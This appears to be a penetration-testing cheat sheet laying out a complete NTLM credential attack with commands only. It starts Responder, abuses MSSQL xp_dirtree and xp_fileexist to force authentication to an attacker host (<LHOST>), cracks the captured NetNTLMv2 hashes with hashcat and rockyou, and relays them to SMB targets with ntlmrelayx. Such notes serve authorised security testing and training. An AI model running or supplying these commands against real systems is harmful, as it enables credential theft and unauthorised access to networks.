```
# Setup Responder:
sudo responder -I tun0 -wv

# In MSSQL — trigger UNC auth:
EXEC xp_dirtree '\\<LHOST>\share';
EXEC xp_fileexist '\\<LHOST>\share\file';

# Crack captured NetNTLMv2:
hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay (if SMB signing off):
sudo python3 ntlmrelayx.py -t smb://<TARGET_IP> -smb2support
```